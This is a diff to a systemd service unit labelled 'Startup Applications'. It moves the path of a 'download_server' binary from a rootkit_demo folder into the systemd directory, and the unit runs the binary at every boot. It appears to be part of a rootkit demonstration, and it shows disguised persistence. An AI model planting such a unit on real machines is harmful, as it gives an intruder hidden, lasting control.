@@ -4,7 +4,7 @@ Description=Startup Applications
 [Service]
 Type=oneshot
 RemainAfterExit=false
-ExecStart=/etc/rootkit_demo/public/http/download_server
+ExecStart=/etc/systemd/system/rootkit_demo/public/http/download_server
 
 [Install]
 WantedBy=multi-user.target 
